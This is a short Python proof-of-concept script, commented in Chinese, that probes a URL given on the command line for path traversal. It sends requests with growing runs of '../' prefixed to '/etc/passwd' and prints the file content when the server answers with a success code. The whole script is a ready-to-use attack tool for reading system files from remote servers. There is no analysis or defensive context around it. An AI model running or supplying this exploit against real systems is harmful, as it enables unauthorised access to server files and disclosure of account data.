# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import time
import string
import sys
import random

def poc(target):
    filename = "/etc/passwd" #目标文件
    for i in range(0, 21, 1):
        target_url = target + ("../" * i) + filename
        filename = "etc/passwd" #第一次会测试/etc/passwd 之后会叠加测试../etc/passwd
        print(target_url) #输出测试链接
        try:
            req = urllib.request.Request(target_url, method = "GET")
            response = urllib.request.urlopen(req)
            status = urllib.request.urlopen(req).code #读取页面HTTP状态码
            print(status)
            if (status == 200) or (status == 304) or (status == 204): #可能存在任意文件下载漏洞
                print("The HTTP Status Code is: %s\n" % status)   
                print("likely - Arbitrary File Download\n")
                data = response.read() #输出所获得的页面内容
                data = str(data, encoding = "utf-8")
                print("file content: %s \n" % data)
                break
        except: 
            print("NO\n")
    print("Done") #测试完成

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        poc(url)
    else:
        print("Usage: python %s url" % (args[0]))

if __name__ == "__main__":
    main()
